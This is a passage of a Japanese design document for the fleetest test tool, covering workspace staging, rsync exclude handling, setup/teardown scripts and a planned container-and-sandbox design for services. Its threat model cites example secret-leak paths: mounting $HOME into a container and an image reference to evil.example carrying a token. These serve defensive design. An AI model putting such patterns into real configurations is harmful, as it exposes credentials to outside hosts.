  例 `TestProjects/E2E-Android/workspace`)。**つまりワークスペースは常に有効**——
  ローカル実行でも毎回このパスへステージングが走る。明示指定(`remoteControl.workspace` / `--workspace`)は
  従来どおり残り、優先順は **明示 `--workspace` > `remoteControl.workspace` > 既定**
  (`ProfileResolver.resolveWorkspaceRoot`。純粋関数)
- **プロジェクトルート配下なら専用ミラーは不要**: 既定のワークスペースを含め、ワークスペースが
  プロジェクトルートの配下にあるときは、`TestProjects/<project>/` の通常の転送(§13。
  `RemoteTransferPlan.rsyncArgs`)がステージング済みの `apps/` ごとそのまま運ぶ ——
  同じバイトを二度送らない。判定と、配下のときのリモート絶対パスの計算(`<RemoteLayout.
  projectDir(project)>/<プロジェクトルートからの相対パス>`。既定なら
  `<base>/users/<issuer>/work/TestProjects/<project>/workspace`)は `FTCore.WorkspaceRemoteDispatch.placement`
  (パス計算だけの純粋関数。プロジェクトルートそのもの・似た名前の兄弟ディレクトリ
  `…/E2E-Android-x` を誤って配下と判定しないことを Tests/FTCoreTests/RemoteDispatchTests.swift
  が固定する)。配下でない(明示指定でプロジェクト外を指した)ときだけ、従来どおり専用ミラーを
  rsync する
- **順序の罠**: ワークスペースの用意(ステージング)は `TestProjects/<project>/` の転送より
  **必ず先**(`RemoteRunDispatcher.prepareWorkspace` → `transfer`)。配下のときは転送がステージング
  結果をそのまま運ぶため、逆にすると直前にステージングしたファイルが漏れる

- **スキーマ**: 実行プロファイルに任意で `"remoteControl": { "workspace": "<絶対パス or リポジトリ
  ルート相対パス>" }` を書く(`Sources/FTCore/RunProfile.swift` の `RemoteControlSection`)。
  **run 前後のスクリプトはここに書かない**(下記)。
  同期相手: `vscode-fleetest/schemas/run-profile.schema.json` と拡張のプロファイルフォーム
- **`ResolvedAppTarget` は原本とインストール先を別々に持つ**(`Sources/FTCore/RunProfile.swift`):
  `sourcePath` = リポジトリルート基準で解決した原本の絶対パス(常に不変)/
  `appPath` = インストールに実際に使う絶対パス(常に `"<workspaceRoot>/apps/[physical/]<declared
  のハッシュ12桁>/<declared のファイル名>"`。既定/明示を問わない)。既存の呼び出し側
  (`InstallPathResolver`・`ProfileWorkerFactory`・`installApp()` の RPC フォールバック等)は
  従来どおり `appPath` だけを見ればよい ―― ステージングが済んでいれば自動的に正しい場所を指す
- **インストール先の規則は1箇所**: `WorkspaceAppStaging.installPath(declared:workspaceRoot:physical:)`
  (`Sources/FTCore/WorkspaceAppStaging.swift`)。`ProfileResolver.resolve`(`ResolvedAppTarget.appPath`
  の計算。`section.appPath`/`section.appPathPhysical` の生文字列をそのまま渡す)と
  `RemoteRunDispatcher`(ミラー直前のステージング先。`ProfileResolver.declaredAppPaths` が返す
  `DeclaredAppPathEntry.declared` を渡す)の両方がここを呼ぶ。**`declared` には必ず宣言の生文字列
  (resolvePath で絶対化する前)を渡す** —— 絶対パスを渡すと repoRoot の違いでローカル/リモートの
  名前空間がずれる(上記)。絶対パスの appPath でも**常に**この規則で apps/ 配下へ切り替わる
  (相対/絶対で分岐しない —— 分岐すると「絶対パスで書いたプロファイルだけリモートで
  見つからない」という同種の不具合が残る)
- **ステージング**(`WorkspaceAppStaging.stageApp(source:dest:)`): 原本をインストール先へ
  実際にコピーする I/O。**冪等・差分のみ** —— フィンガープリント(バイト数+自分自身の更新日時。
  中身は読まない)が一致すればコピーを飛ばす。115MB の .app 全体を毎回ハッシュすると
  「変化していなければ読まない」という目的に反するため、rsync の既定クイックチェック
  (`--checksum` を渡さない限り size+mtime で十分とみなす)と同じ根拠を採用。ディレクトリ
  (iOS の `.app`)は配下ファイルの総バイト数(深い変更も拾う。属性のみ走査しバイトは読まない)+
  自分自身の更新日時で判定する。コピー後に dest の mtime を明示的に原本と揃える(`copyItem` の
  mtime 保持はプラットフォーム実装に依存するため、次回の一致判定をそこに頼らせない)。
  **原本が無ければ dest も無いときだけエラー**(原本のパスを名指しする ―― インストール先を
  出しても何をビルドすればよいか分からない)。**原本が無くても dest が既にあれば何もしない**
  (リモートの子は rsync で複製だけを受け取り原本を持たない。ここを常にエラーにすると、
  この節が解決した「リモートで appPath が見つからない」問題へ逆戻りする)
- **雛形**: ワークスペース配下に `apps/` `scripts/` `data/` の3フォルダを規約として置く
  (中身は自由・強制しない)。無ければ作る(`Sources/FTCore/WorkspaceScaffold.swift`)。
  `apps/` はステージング済みバイナリの複製なので `.gitignore`(`TestProjects/*/workspace/apps/`)
  で無視する。`scripts/`・`data/` は利用者が書くものなので無視しない
- **呼び出し場所**(run 時3箇所 + 導入時2箇所): 導入時は `ProjectScaffold.create`
  (project create / init)と `fleetest project sync`(update.sh が毎回呼ぶ = 既存の受け手への
  配達口)が**既定ワークスペースにだけ**置く(宣言されたワークスペースは実行プロファイルの
  属性で、導入時点では存在しないため run 時の ensure が受け持つ)。
  run 時(プロファイル解決の直後): ローカル実行 `ProfileRunner.run` /
  `ApiRunCommand`(自分自身の `resolved.apps` を `WorkspaceAppStaging.stageWorkspaceApps` で揃える)、
  および `RemoteRunDispatcher.prepareWorkspace`(project の rsync 直前、ローカル側の
  ワークスペースへ揃える。マシン/デバイス解決を経由しない軽量読み `ProfileResolver.
  declaredAppPaths` で原本パス(`source`)と宣言の生文字列(`declared`)の両方を取得する ——
  installPath の名前空間には必ず `declared` を渡す)。同じコードパスがリモートの子(ssh 越しに
  実行される `fleetest run`/`api run` 自身)でも走るが、そちらは原本を持たないため
  上記の「dest があれば無視」で無害化される
- **ミラー(プロジェクト外を指したときだけ)**: `--runner` ディスパッチ時、`TestProjects/<project>/`
  の転送(§13)とは別枠でワークスペースを丸ごと rsync する(`RemoteTransferPlan.
  workspaceRsyncArgs` = `-az --delete`、除外は `.git`/`.DS_Store`/`node_modules`)。
  ミラー先はプロジェクトごとに分ける(`<base>/users/<issuer>/work/workspace/<project>/`。
  `RemoteLayout.workspaceDir`)
- **`--workspace <path>`(hidden)**: `fleetest run` / `fleetest api run` の両方に持つ。
  実行プロファイルの `remoteControl.workspace`(既定込みの実効値)を1回限り上書きする
  (`ProfileResolver.effectiveWorkspaceRaw` = override が非空なら常に勝つ)。**手で打つものでは
  ない** —— リモートディスパッチ(`Sources/fleetest/RemoteRunDispatcher.swift` の
  `prepareWorkspace`)が、`WorkspaceRemoteDispatch.placement` の計算結果(配下ならプロジェクト
  ディレクトリ配下のパス、配下でなければミラー先)をリモートの子(`fleetest run/api run
  --runner local …`)へ必ず渡す。渡し漏れると子は自分自身の既定/宣言で別のパスを組み立ててしまう
- **多ホスト(§13 DeviceMachineRunner/ApiRunMachineFanout・フリート§8)への波及なし**: どちらも
  ホストごとの子プロセスとして `fleetest (api) run --runner <label> …` を起動するだけで、
  各子は自分自身が `RemoteRunDispatcher` を経由するときに独立してワークスペースの用意を行う
  (二重実装ではなく、既存の子プロセス起動経路にこの節の機構がそのまま乗る)

### 転送から外す(`.fleetest-transfer-ignore`。2026-08-23)

受け手報告(3機構成): スタブサーバの端末登録台帳をワークスペース内に置いていたため、
ディスパッチのたびの rsync `--delete` が**手元の台帳でランナー機の台帳を上書き**し、
ランナー機の端末が未登録 → ログインを含むシナリオがランナーで全滅した。同型は `*.log` や
リース台帳 —— **開始/終了スクリプトで起こすサービスはたいてい状態やログをワークスペース内に
持つ**ので、受け手ごとの回避策(環境変数で外へ逃がす・シンボリックリンク)ではなく汎用の口を置く。

- **宣言はファイル1つ**: 転送対象のツリー(プロジェクト転送なら `TestProjects/<project>/`、
  プロジェクト外のミラーならワークスペース)の**どのディレクトリにでも**置ける
  `.fleetest-transfer-ignore`。中身は rsync の `--exclude` パターンで、**置いたディレクトリ起点**
  (rsync の `-F`/dir-merge と同じ感覚)。規則の定義元は `Sources/FTCore/TransferIgnore.swift` の冒頭
- **rsync の `-F`(dir-merge)を使わず fleetest が読んで `--exclude` へ翻訳する理由**: macOS 標準の
  rsync は **openrsync** で、**dir-merge の規則は `--delete` から受け側を守らない**
  (2026-08-23 実験。ローカル→ローカルで受け側の除外対象が消えた)。グローバルの `--exclude` なら
  守る(同日、M1Max への ssh 越しの実ディスパッチでも確認: 除外パスは送られず・ランナー側の
  既存ファイルは残り・除外していない残骸だけ消えた)。要件は「送らない」だけでなく**「向こうの物を
  消さない」**なので翻訳が要る。非固定パターンは `<dir>/P` と `<dir>/**/P` の2本にする
  (openrsync は `/<dir>/**/P` だけだと `<dir>/P` 自身に当たらない)
- **3つの転送が同じ走査を通る**(`RemoteTransferPlan.projectIgnore` / `workspaceIgnore`。
  `rsyncArgs`/`workspaceRsyncArgs` の `ignore:` は既定値を置かない = 読み忘れはコンパイルで止まる):
  run のディスパッチ(`RemoteRunDispatcher.transfer`)・モニター/デバイスの fan-out
  (`RemoteProjectSync`。**これも `--delete` 付きでプロジェクトを運ぶ**ので、run だけ読んでも
  fan-out の転送で台帳が消える)・プロジェクト外ワークスペースのミラー
- **黙って効かせない**: 宣言があるときだけ転送ログに1行(`==> .fleetest-transfer-ignore: N exclude
  pattern(s) from <files>`)。受け手が「まだ上書きされる」ときに読まれたかどうかを切り分けられる
- **却下**: 実行プロファイルのキー(`remoteControl.transferExcludes`)—— 除外はワークスペースの
  性質(サービスが何を書くか)であって run の構成ではなく、fan-out の転送はプロファイルを持たない。
  開始/終了スクリプトと同じく「名前と置き場所が固定のファイル」で揃える /
  既定除外(`*.log`・`.stub-leases/`)—— アプリ固有の名前を推測で焼き込まない。`*.log` を
  資材として運ぶ受け手を黙って壊す
- 除外を足す前に運ばれた複製はランナー側に残る(除外は削除もしないため)。受け手向けの説明と
  書式の例は docs/remote-runner-setup.md §機械ごとの状態・ログを転送から外す

### 開始/終了スクリプト(2026-08-18)

> **この節は今の実装(枠の外で動くスクリプト)の記録**。置き換える設計は下の「サービスの宣言とスクリプトの
> サンドボックス化」(2026-10-14・未実装)。実装したら、この節は「実装前の形」として畳み、規則は新しい節へ移す。

テスト対象が依存する DB・スタブサーバ等を、**テストを走らせる機械の上で**起こして片付けるための口。
ポートの取り方・待ち方・データの投入は**利用者のスクリプトが決める**(仕組み側は起動と片付けの
保証だけを持つ)。

- **宣言は無い**。ワークスペースの **`scripts/run-setup.sh`** と **`scripts/run-teardown.sh`** が
  **存在すれば実行する**、それだけ(`FTCore.RunHookPlan`)。プロファイルに項目を増やさない ——
  名前と置き場所が1つに決まっているほうが、受け手にも回収側にも読み違えが起きない。
  無ければ何もしない(スクリプトを使わない利用者に空ファイルを強いない)
- **実行場所はランナー機**。呼ぶのは `ProfileRunner.run` と `ApiRunCommand` の2箇所
  (ワークスペースのステージングと同じ場所)で、リモートの子は `fleetest run --runner local` として
  向こうで同じコードを通る —— **`RemoteRunDispatcher` には何も足さない**(手元とリモートで
  実装が割れない)。ワークスペースごと運ばれるので、スクリプトと資材は勝手に届く
- **順序**: デバイスに触る前に撃つ(依存サービスが無いままシミュレータを起こしても、
  全シナリオが「アプリの不具合」の顔で落ちるだけ)。渡すデバイス一覧は**絞り込み後**の
  ものを使う(`--device` / `--device-machine` で減ったデバイスを渡すと `adb reverse` の宛先がずれる)
- **`--dry-run` では撃たない**(`run` / `api run` の両方。`RunHookDryRunWiringTests` が走査で固定)。
  dry-run は `dispatch.lock` を取らないので、撃つと同じ機械で走行中の run の依存サービスを
  dry-run の teardown が落としうる。dry-run の目的(シナリオがビルドでき手順が組めるか)にも要らない
- **失敗の扱い**: setup が非0 → **run を止める**(インフラ起因。§16.7 の「シナリオの失敗と
  区別する」に乗せる。シナリオは1本も走らない)/ teardown が非0 → **警告のみ**
  (片付けの失敗で結果を赤にすると、通ったのか落ちたのかが読めなくなる)。
  setup が落ちた場合もその場で teardown を撃つ(途中まで起きたものを残さない)
- **刺さっても打ち切らない。代わりに無音を本人に言う**(`FTCore.RunHookStall`)。上限を決める根拠が
  こちらに無い(起こすものは利用者が決める)ので timeout は置かず、**出力の無い時間が 60 秒を跨ぐ
  たびに警告を 1 行**出して待ち続ける(「still running (pid N) — check the script, or kill pid N」)。
  出力が来れば数え直す。60 秒の根拠は「典型の setup は出力しながら数秒〜数十秒で戻り、stdin が
  /dev/null なので対話待ちは即 EOF」= 残る無音はネットワーク待ち・ロック待ちの形
- **ssh 越しに起こしたプロセスは macOS のローカルネットワーク権限を取れない**(2026-08-26 の実害)。
  ディスパッチで走る run-setup.sh は sshd の下で動くため、そこから起こしたプロセスが**同じ機械の
  他アドレス**(コンテナの仮想ネットワーク 192.168.64.x、Bonjour、LAN)へ出ようとすると
  `EHOSTUNREACH` で弾かれる。**許可を与える相手が「システム設定 > プライバシーとセキュリティ >
  ローカルネットワーク」の一覧に現れない**(ssh は GUI アプリではない)ので、権限を足して直す
  ことはできない。症状は「手で(画面のターミナルから)流すと通るのに、ディスパッチだと setup が
  非0で run が中止される」。**依存サービスは loopback で繋ぐ** —— コンテナ実行基盤は 127.0.0.1 へ
  publish していることが多く(実例: PostgreSQL が `127.0.0.1:5432` で LISTEN しているのに、
  接続先をコンテナ IP にしていたため弾かれていた)、接続先を `127.0.0.1` にするだけで権限が
  経路から消える。**どうしても LAN 越しが要るなら**、そのサービスはランナーの GUI セッションで
  常駐させる(LaunchAgent 等)—— run-setup.sh は健全なら再利用して素通しするので、run 側は変えなくてよい。
  **切り分け**: ランナーの画面のターミナルで同じ run-setup.sh を流して通るなら、この権限の問題
  (ツール側の不具合ではない)
- **環境変数**(利用者のスクリプトが読む契約。`RunHookEnvironment`):
  `FT_HOOK`(setup/teardown)・`FT_WORKSPACE`・`FT_PROJECT`・`FT_PROFILE`・
  `FT_REPORT_DIR`・`FT_IOS_DEVICES`・`FT_ANDROID_DEVICES`(空白区切りのデバイス名)。
  **値が無いときもキーは置く**(落とすと呼び出し側の `set -u` が落ちる)。
  **エミュレータの adb serial・シミュレータの UDID は載らない** —— 実体の解決は run の中で
  ワーカーを組むときに起きるので、setup の時点ではまだ決まっていない(必要なスクリプトは
  `adb devices` を自分で叩く)
- **実行権が無ければ `/bin/sh` で起動する**(chmod を忘れただけで止めない)。あれば直接起動 =
  shebang を尊重する(python で書いた片付けが sh に食われない)
- **タイムアウトは置かない**。妥当な上限を決める根拠がこちら側に無い(何を起こすかは利用者が
  決める)。リモート実行はディスパッチ全体の上限(§16.2)が外側から縛る
- **片付けの保証**(ここが一番壊れやすい): 正常系は `defer`。**プロセスが defer に到達できずに
  死んだ場合**(ssh 切断の SIGHUP・SIGKILL・停電)に備えて、setup を撃つ**前**に
  `<repoRoot>/.fleetest/hooks/<pid>.json` へ控えを置く(`FTCore.RunHookLease`。**プロジェクト
  非依存** —— 掴まれたポートはホスト全体の資源で、次に走るのが別プロジェクトでも同じ衝突を
  起こす)。**次の run の開始時**と **`fleetest hooks reap`** がこれを見て、死んだ pid のぶんの
  終了スクリプトを代わりに撃つ。`fleetest remote clean` は `devices down` の**前**にこれを撃つ
  (終了スクリプトはデバイスに触りうる)。
  **生存判定は pid だけ**(RunLease と違い mtime は見ない) —— run は数十分かかりうるので、
  無音の時間で「古い」と判定すると**動いている run の DB を落とす**
- **孤児から撃つ終了スクリプトはプロファイルを読み直さない**(控えに書いた絶対パスをそのまま
  撃つ)。残した run のプロファイルは既に書き換えられているかもしれない
- **拡張のフォームには入力欄を置かない**(2026-08-18 のユーザー決定)。「リモート制御」の
  セクションに置くのは**「スクリプトの雛形を作成する」ボタン**だけ ——
  `<workspace>/scripts/` に雛形を書き(`vscode-fleetest/src/runHookScaffold.ts`)、開いて見せる。
  **使い方(環境変数・実行規則)は雛形のコメントに書く** —— 画面の説明文とファイル内コメントの
  二重管理にしない。**既にあるファイルは1バイトも触らない**(利用者が書いた片付け手順を
  雛形で潰すと、次の run が古い環境を掴んだまま走る)。**雛形の中身は locale に追従する**
  (`vscode-fleetest/src/i18n/strings/hookScaffold.ts` の ja/en。日本語モードならコメントも日本語。
  生成物だが利用者が読むので UI と同じ扱いにする)。中身は実行規則の説明そのものなので、
  規則を変えたらここと一緒に直す

### サービスの宣言とスクリプトのサンドボックス化(設計: 2026-10-14。未実装)

**上の「開始/終了スクリプト」を置き換える設計**。今のスクリプトは枠の外で親の環境を全部継いで動くので、
AIアシスタントが書いた・他人から受け取ったスクリプトが `~/.ssh` を読む・ホームに書く・トークンを読むのを
止められない(`ft_start_run` の承認だけが砦)。用途は3つに限る —— **①SUT の Web/DB サーバー
②スタブサーバー ③許可した範囲でのファイル操作とデータ投入**。

**分け方の原則: 危険の出どころで分ける**。①②の危険はコンテナの実行基盤(Docker のデーモン / Apple Container の
apiserver は枠の外にあり、頼めば任意のマウント・特権・ホストの名前空間を実行する。`docker run -v $HOME:/h` で
枠の中からホストの秘密を読める)、③の危険は書く場所だけで、これは Seatbelt が強制できる。だから ①② は
**宣言にして親が検査してから実行**し、③ は**シェルのまま枠に入れる**。

| 段 | 置き場 | 動く場所 |
|---|---|---|
| アプリ(.app / .apk)の用意 | プロファイルの `appPath`(今のまま) | **fleetest の外**(CI・別の機械)。fleetest はビルドしない |
| サーバー・スタブ | `<workspace>/scripts/compose.yaml` | Docker または Apple Container。**親**が検査して起動・終了 |
| 準備・片付け | `<workspace>/scripts/run-setup.sh` / `run-teardown.sh` | **Seatbelt の中**(シナリオと同じ全拒否の土台) |

**決めたこと(ユーザー決定 2026-10-14)**:

- **アプリはビルドしない・成果物を受け取る**。CMP / RN の iOS は Xcode が要るので Linux コンテナで動かず、
  Seatbelt の中では SwiftPM / xcodebuild の入れ子のサンドボックスで落ちる(sandbox-seatbelt.md §2.8。
  xcodebuild は未実測)。動いたとしても、ビルドは clone したコード(Gradle のスクリプト・`postinstall`・
  Run Script フェーズ)の実行そのもので、通信・`~/.gradle`(読み取り拒否の対象)・常駐デーモンまで
  開けると枠が残らない。**URL から成果物を取ってくる機能も作らない**(取得元の検査が別に要る)
- **サーバーはコンテナに限る**。ホストで直接動くサーバー(`npm start` 等)は対象外 ——
  枠の中から常駐プロセスを残させない(下の「スクリプト」⑤。**保証ではなく目標** = 離脱した子孫は検出できないこともある)
- **ランタイムは Docker と Apple Container の両方**。書くのはどちらでも同じ `compose.yaml`
- **コンテナは外部へ出られない**(実行時のネットワークを外へ出られない種類に固定する。下の「ネットワーク」)。
  許可した宛先だけを親のプロキシで通す
- **スクリプトの既定の書き込み先は `<workspace>/data/` だけ**。足すのはマシン側の
  `~/.config/fleetest/config.json` だけ(プロジェクト・プロファイル・環境変数から広げられない = §11.7 と同じ理由)
- **ランタイムは compose.yaml があるときだけ必須**(ランナー機も同じ)
- **旧来の「枠の外のスクリプト」は残さない**(未公開なので互換の経路を置かない)
- **サーバーのイメージも基本は受け取る**(下の「サーバーのイメージの用意」)。手元の開発用に、マシン側で名指しした
  読み取り専用のビルド元からのビルドだけ許す
- **サービスは run ごとに起動して止める**(コンテナとネットワークは消し、名前付きボリュームは残す)。2026-08-18 の
  「run-teardown.sh はサーバーを止めない」決定の理由(Gradle の起動待ち・Terminal のウィンドウが溜まる)はコンテナでは
  消える(sut-ec-mobile のサーバーで起動 → `/health` が 1.6〜3 s)。残すと古いコードのサーバー・前の run の状態・起動直後の
  UDP の経路の確認が意味を失う。起動に数十秒かかるサービスが実際に出たら「残す」印を足すかをそのときに決める
- **MCP の単発実行(`ft_run_scenario`)はサービスを起こさない**(今のまま)。代わりに **`fleetest services up` / `down` /
  `status` と MCP の `ft_services`**(本番の実行と同じく承認を求める)を置き、探索・シナリオを書く前・ライブ操作で
  バックエンドを起こせるようにする。**本番の run は手で起こしたサービスと混ぜない**(いつも自分で起こし直して自分で止める
  = 結果を再現できる形)。**調停は明示の印で行う**(レビュー 2026-10-14): `services up` は CLI がすぐ終わるので pid の生存で
  lease を判定できない → デバイスの `mcp-<鍵>.lease` と同型の印を `up` で置き `down` で消す。run は印があれば**警告して
  引き取る**(ライブ操作中のサービスを黙って潰さない。文言はデバイスの run-lease と同じ体系)。`services down` は run が
  握っている(run の控えが生きている)なら断る。`services up` は dispatch.lock を取らない(MCP の印と同じ扱い)。
  **作成・引き取り・down・reset・孤児回収は、プロジェクトの接頭辞ごとの短い排他(`services.lock/<prefix>.lock` = flock)の中で
  「確認 → 変更」を行う**(dispatch.lock は run 同士しか直列化しない = run と up・二人の up が同じ名前を同時に作り消せる。
  Codex レビュー 2026-10-14 #14)。`reset` は run か up の印があれば断る(押し切るのは CLI の `--force` だけ)。**`services up` は常駐の所有者プロセス
  (fm-serve と同型)を起こし、それがプロキシ・印・adb reverse を持つ**(CLI がすぐ終わるとプロキシが消え、起動済みの
  コンテナに存在しない宛先の `HTTP_PROXY` が残る。Codex レビュー 2026-10-14 #16)。`down` が所有者を止める。所有者が死んだ印は未回収として
  次の run / reap が片付ける。**引き取りの手順**(Codex レビュー2 2026-10-14 #6): run は排他の中で印を「引き取り中(新しい世代)」に書き換え、
  **排他を外して旧所有者の終了を待ち**(旧所有者も同じ排他で片付けるので、握ったまま待つと待ち合う)、終わったら再取得して
  世代を確かめてから作る。旧所有者は**自分の世代の資源 ID だけ**を片付ける(新しい世代のコンテナや reverse を消さない)。
  **実装(⑤)は印の書き換えを持たない**: 所有者は常駐プロセスなので印の生存は pid で判定でき、合図は SIGTERM そのもの
  (`ServicesSession.takeOverOwners` = 排他の中で生きている所有者の控えを見つけて SIGTERM → **排他を外して**所有者の終了を待つ
  (上限は所有者の控えの `stopGraceSeconds` から導く `ServicesTeardown.teardownBudgetSeconds`。尽きたら pid を言って止める)→
  取り直して `claimPrefix`)。所有者は自分の控えの ID だけを消して控えを消すので、終わった後に run が同じ名前で作れる。
  片付けに失敗して残った控えは孤児として `claimPrefix` が ID で拾う。控えの `kind`(`run` / `owner`)で `down` / `reset` の
  断りの文言と対処(run は待つ・owner は `services down`)を分ける
  **排他の実体は固定ファイルの flock**(Codex レビュー 2026-10-15。当初は mkdir + 「死んだ持ち主を照合して削除」だったが、照合と削除の
  間に別の取得が入ると他者のロックを消して 2 者が同時に本体へ入れる。flock は持ち主が死ねばカーネルが外し、他者の取得を消す操作が無い。
  ファイルの中の PID と開始時刻は `services status` の表示用で、握られているかは flock で見る)。**読めない控え(壊れた JSON)は残して「不明」と報告し、その接頭辞の新しい起動を止める**
  (資源を特定できないまま作ると二重になる)。人の入口は `services reset --force`(接頭辞で列挙した全部を消す)
- **サービス用の秘密はマシン側のファイル**(`account()` と同じ考え方。例: `~/.config/fleetest/secrets/<プロジェクト>.env`。
  ワークスペースの外 = 転送されない・ランナー機にはそれぞれ置く)。下の「変数の展開」。**置き場は子の読み取りから名指しで
  拒否する**(子が `~/.config/fleetest` の下で読めるのは `config.json` とそのプロジェクトのデータセットだけ =
  `ScenarioSandbox.readReopenedPaths` なので `secrets/` は開け直しの範囲外。それでも「後に書いた規則が勝つ」で
  `secrets/`・`private/` を名指しで閉じ直す規則は残す = 開け直しの範囲を広げる変更が入っても、シナリオとスクリプトが
  ファイルを直接読めて「参照している名前だけ渡す」が意味を失う形に戻らないための二重の守り)

#### 順序と失敗の扱い

イメージの用意(取得・ビルド)→ ネットワークとコンテナの起動 → 起動完了の待ち → `run-setup.sh` → run →
`run-teardown.sh` → コンテナとネットワークの削除。どれも無ければ飛ばす。

- **起動の失敗・検査の拒否は run を止める**(setup の失敗と同じ。シナリオは1本も走らない)。
  setup が落ちたら teardown → 削除の順で片付けてから止める。**記録するのはフェーズ(検査・取得・ビルド・起動・待ち・setup)と
  終了状態だけで、「インフラ起因」という分類は置かない**(アプリの初期化の不具合による healthcheck の失敗も同じ顔をする =
  失敗の記録は事実だけの方針。Codex レビュー 2026-10-14 #28)
- **teardown / 削除の失敗は警告のみ**(今の teardown と同じ)
- **刺さっても打ち切らない**(`RunHookStall` をそのまま使う)のはスクリプト・イメージの取得・ビルド・初期化サービス
  (`service_completed_successfully`)の正常終了の待ちだけ(無音の警告を出す。Codex レビュー5 2026-10-14)。
  起動完了の待ちは `retries` × (`interval` + `timeout`) + `start_period` で有限(セルフレビュー 2026-10-14。例外は
  `service_completed_successfully` の正常終了の待ち = 下)。
  **起動完了の待ちの規則**(レビュー 2026-10-14): ①`healthcheck` の無いサービスは「コンテナが起動した」で使えるとみなす
  (推奨は healthcheck を書く。雛形に入れる)②**待っている間にコンテナが終了したら即座に失敗**(`restart` は断っているので
  起き直らない。ログの末尾を添える)③`healthcheck.retries` を超えて失敗が続いたら失敗(compose の `service_healthy` と同じ)。
  ②③が無いと、死んだコンテナを相手に無音の警告を出し続ける。**compose の意味に合わせる**(Codex レビュー 2026-10-14 #21): `timeout` を超えた
  検査は失敗1回・`interval`・`start_period`(この間の失敗は数えない)・`disable: true` / `test: ["NONE"]` は healthcheck なし・
  **イメージ内の `HEALTHCHECK` は使わない**(exec で再現できないので compose に書かせる。あれば起動時に1行言う)・
  `depends_on` の循環は検査で断る・**`condition: service_completed_successfully` の初期化サービスは「正常終了 = 完了」**
  (②の「終了 = 失敗」はそれ以外のサービスに当てる)。**正常終了の待ちには期限を置かない**(Codex レビュー4 2026-10-14 #2 への回答): 初期化
  サービス(migrate 等)は利用者のコードで、妥当な上限を決める根拠がこちらに無い = スクリプトと同じ扱い。**コンテナのログの
  無音が `RunHookStall` の閾値を跨ぐたびに警告を1行出して待ち続け**、異常終了(非0)したら即座に失敗する。**実装は前面実行**
  (②で判明: Apple Container 1.1.0 の `inspect` は `status.state` だけで終了コードを持たない。前面の `run` は両ランタイムで
  コンテナの終了コードをそのまま返す(実測 3 → 3)ので、初期化サービスは `-d` 無しで `runLong` から起こし CLI の終了コードで
  決着する。**初期化サービスのネットワークは1つに限る**(前面実行の後からはつなげない。検査で断る))。打ち切るのは
  中断(SIGINT / SIGTERM)だけ。対応しない形は起動の前に断る
- **デバイスに触る前に撃つ・渡すデバイス一覧は絞り込み後**(今と同じ)
- **dry-run はサービスもスクリプトも動かさない**(今の hooks と同じ。セルフレビュー 2026-10-14)。**配線は `run` と `api run` の2経路に同じものを入れる**
  (呼ぶのは今の hooks と同じ `ProfileRunner.run` と `ApiRunCommand` の2箇所・`RemoteRunDispatcher` には足さない)。
  **新しいフラグは足さない**(compose.yaml の有無で決まる = `RunCommandFlagParityTests` を動かさない)

#### 構成: 解釈と検査は1つ、実行はランタイムごと

**compose.yaml は fleetest が自分で読む**(Apple Container には compose が無い。2026-10 時点で公式の対応は無く、
第三者の実装は未成熟)。2つのランタイムで検査が割れないように、**解釈 → 検査 → 実行計画までを1本**にし、
ランタイムは計画を実行するだけにする。**Docker でも `docker compose` は使わない**(compose に任せると、
Docker の側だけ compose の解釈・既定値で動き、Apple Container の側と黙って食い違う)。

```
compose.yaml ──(解釈)──▶ ServiceSpec ──(ComposePolicy で検査)──▶ ServicePlan ──┬─▶ DockerBackend(docker CLI)
                                                                              └─▶ AppleContainerBackend(container CLI)
```

- **読める書き方は検査が許す範囲だけ**(下の許可リスト)。**YAML の読み取りは Yams**(ユーザー決定 2026-10-14。
  中身は C の libyaml)。**置き場は新しい CLI 専用ターゲット `FTServices`**(セルフレビュー 2026-10-14): シナリオ実行バイナリは `FTScenarioRunner` +
  `FTDSL` → `FTCore` にリンクするので、FTCore に置くと受け手のシナリオ実行バイナリにまで Yams が**リンク**される。
  (**取得・解決は分ける**: SwiftPM はマニフェストの依存を使う product に関わらず解決するので、受け手でも Yams は取得される =
  今の grpc-swift と同じ。FTServices が避けるのはリンクだけ。Codex レビュー4 2026-10-14 #4)。`FTRemote` と同じ置き方(依存は FTCore + Yams・使うのは `fleetest` と `fleetest-mcp`・テストは
  `FTServicesTests`)。FTCore から FTServices は参照しない。`ServicePolicy` は broker に方針を差し込む口(protocol)を FTCore に
  作り、FTServices から渡す。信頼できない入力を読むので、
  **ファイルの大きさとエイリアスの展開数に上限**を置く(展開で膨らませる攻撃への備え。値と根拠は実装のときに決めて
  名前付きで1箇所に置く)
- **変数の展開はマシン側の秘密のファイルと `scripts/.env` からだけ**(同じ名前は秘密のファイルが勝つ)。親の環境変数は
  使わない(compose の既定は親の環境を読むが、そうするとシェルのトークンを compose.yaml の `${…}` 経由で環境変数として
  コンテナへ渡せる)。**秘密を展開できるのはサービスの `environment` の値だけ**(`image` / `build.args` / `ports` /
  `volumes` / `command` / `entrypoint` / `healthcheck` への展開は断る —— `image: evil.example/${TOKEN}` と書けば親の pull が
  秘密を取得先へ送り、`build.args` なら外へ出られるビルドから送れる。Codex レビュー 2026-10-14 #1)。**run-setup.sh / run-teardown.sh には、compose.yaml が
  参照している名前だけを**秘密のファイルから環境変数で渡す(関係のない秘密は渡さない)。**秘密をコマンドラインに載せない**
  (`-e KEY=VALUE` は `ps` に出る)→ **解決した値を親専用の env-file に書いて `--env-file` で渡す。`-e KEY` の形は使わない**
  (値が無いとき親の環境へ落ちる = `environment: [GITHUB_TOKEN]` で親のトークンが渡る。Codex レビュー2 2026-10-14 #1)。**サービスへ渡す環境と、
  枠の外で動くランタイムの CLI の環境は混ぜない**(CLI に渡すのは `DOCKER_CONFIG` 等の制御変数だけ・サービスの変数は env-file
  だけ)。**間接の参照も断つ**(Codex レビュー2 2026-10-14 #11): 展開の辞書は「秘密」と「`scripts/.env` の普通の変数」に分け、`.env` と `env_file` の
  値の中では秘密を参照できない(`TAG=${TOKEN}` → `image: …/${TAG}` の迂回を塞ぐ)。`$$` は文字の `$`。**展開の処理が「値 + 実際に使った秘密の参照名」を返し、そのメタデータを集約する**(展開済みの文字列を走査すると、
  `PASSWORD=${TOKEN}` が値になった時点で TOKEN が消え、逆に秘密の値に含まれる `${OTHER}` を誤って拾う。Codex レビュー3 2026-10-14 #1)。`env_file` の展開は compose の引用規則に合わせて自前で行う
  **伏せ字は親にも登録する**(Codex レビュー 2026-10-14 #17): `SecretRedactor` の登録は今は子(FTDSL)だけで、親の `ConsoleOut` は素通し → 使った
  秘密の値を親でも登録し、コンソール・NDJSON・保存したサービスのログ・`doctor --bundle` の全出口で伏せる(符号化された形までは
